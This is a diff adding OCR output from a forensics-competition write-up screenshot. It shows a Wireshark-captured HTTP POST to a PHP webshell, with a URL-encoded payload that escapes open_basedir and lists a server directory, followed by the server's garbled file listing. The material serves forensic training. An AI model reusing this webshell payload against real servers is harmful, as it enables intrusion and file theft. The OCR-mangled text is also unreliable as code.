@@ -1,0 +1,44 @@
+# OCR: 49b01778f59ac0ec3440155600f1cae3.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/49b01778f59ac0ec3440155600f1cae3.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Wireshark遍踪HTTP流(tcp.streameq134)·tcpdump.tj.cap
+POST/peiqi.phpHTTP/1.1 Host:222.2.2.180
+Accept-Encoding:gzip,deflate
+User-Agent:opera/9.8e(windowsNT5.1;U;zh-tw)Presto/2.8.131Version/11.1e Content-Type:application/x-ww-form-urlencoded
+Content-Length:1587 Connection:close
+X
+obdc7ea2574c3=LCL3d3dy93d3dyb290L3d3dy50cHNob3AuY29tL2FwcGxpY2F@aw9uLw%3D%3D&peiqi=%40in_set(%22display_errors%22%2C%20%228%22)%3B%40set_time_1imit(0)%3B%240pdir%3D%40ini_get(% 22open_ba5edir%22)%3Bif(%24opdir)%2e%7B%240parr%3Dpreg_5p1it(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%240pdir）%3B%24ocwd%3Ddirname（%24_SERVER%5B%22SCRIPT_FILENAME%22%5D）%3B%24tmdir%3 D%22.3b8672%22%3B%40mkdir(%24tmdir)%3B%4echdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%22..%22)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24oparr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3 B%7D%40iniset(%22openbasedir%22%2C%22%2F%22)%3B%40rmdir%24ocwd.%22%2F%22.%24tmdir)%3B%7D%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%221fb%22.%22236%22%3Becho%20%40asenc(%24output)%3Becho%20%22baacf9%22.%221ec61d%22%3B%7Dob_start()%3Btry%7B%24D%3Dbase64_decode(su bstr(%24P0ST%5B%22oebdc7ea2574c3%22%5D%2C2))%3B%24F%3D%40opendir(%24D)%3Bif(%24F%3D%3DNULL)%7Becho(%22ERR0R%3A%2F%2F%20Path%2eNot%2eFound%200r%20No%20Permission!%22)%3B%7De1se%7 B%24N%3DNULL%3B%24L%3DNULL%3Bwhile（%24N%3D%40readdir(%24F）)%7B%24P%3D%24D.%24N%3B%24T%3D%40date（%22Y-m-d%20H%3Ai%3As%22%2C%40fi1emtime(%24P）)%3B%40%24E%3Dsubstr（baseconvert（%40f 1leperms（%24P)%2C10%2C8)%2C-4)%3B%24R%3D%22%09%22.%24T.%22%09%22.%40filesize（%24P）.%22%09%22.%24E.%22%0A%22%3Bif（%401s_dir（%24P）)%24M.%3D%24N.%22%2F%22.%24R%3Be15e%20%24L.%3D%24N.%24R%3B%7Decho%28%24M.%24L%3B%48c1osedir(%24F)%3B%7D%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERR0R%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Bas0utput()%3Bdie()%3BHTTP/1.120eOK Server: nginx
+Date:Fri,04Mar 202207:17:13GMT
+Content-Type:text/html;charset=uTF-s
+Transfer-Encoding:chunked Connection: close
+Vary:Accept-Encoding Content-Encoding:gzip
+1fb236./ admin/ common/ home/ mobile/.htaccess
+2022-03-0415:17:10 2022-03-04 15:17:13 2020-09-0915:38:04
+2020-09-09 2020-09-09
+15:38:10 15:38:10
+2020-09-09
+15:38:10
+2020-09-09
+15:37:58
+command.php2e2e-e9-09
+common.php
+2020-09-09
+config·php
+2020-09-09
+database.php function.php
+2020-09-09
+route.php
+tags.php
+2020-09-09
+goon21in.zip baacf91ec61d
+15:37:58 15:38:10 15:38:10
+2022-03-03 2020-09-89 15:38:12 15:38:12
+225 4896 184 18 172 1e0 286 736 56353 14684 16:58:35 15:38:10
+1308 109
+2022-03-04 15:17:12
+0755 8755 8755 0755 0755 8755 8755 0755 6755
+e755 1919 19941 8755 8755 7699192
+0777 8755
+0644
